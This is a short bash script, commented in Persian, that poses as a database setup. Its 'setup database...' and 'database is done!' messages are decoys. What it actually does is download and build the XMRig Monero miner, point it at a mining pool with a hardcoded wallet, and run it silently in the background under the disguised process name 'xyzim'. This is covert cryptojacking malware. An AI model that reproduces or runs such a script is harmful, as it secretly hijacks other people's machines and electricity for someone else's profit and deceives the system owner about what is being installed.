#!/bin/bash

set -e

# ===== قابل تنظیم =====
START_MSG="setup database..."
DONE_MSG="database is done!"
PROCESS_NAME="xyzim"

WALLET="49WmcAJJbPEaTq7MusAMs3a2auvwUjqs1b6SqxtmT4g1QtPYus2jzZh7zpZoyt3oHeEZPaVem9F3AcyazyGZEstyVYqikP2"
POOL="gulf.moneroocean.stream:10128"
DIR="/opt/xmrig"

echo "$START_MSG"

# نصب پیش‌نیازها
sudo apt update -y
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev

# دانلود سورس
sudo rm -rf $DIR
sudo git clone https://github.com/xmrig/xmrig.git $DIR

# build مخصوص ARM64
cd $DIR
mkdir -p build && cd build
cmake ..
make -j$(nproc)

# کانفیگ
cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOF

# اجرای nohup با اسم پروسه xyzim
nohup ./xmrig -c config.json --title="$PROCESS_NAME" > /dev/null 2>&1 &

# ذخیره PID
echo $! > /tmp/$PROCESS_NAME.pid

echo "$DONE_MSG"
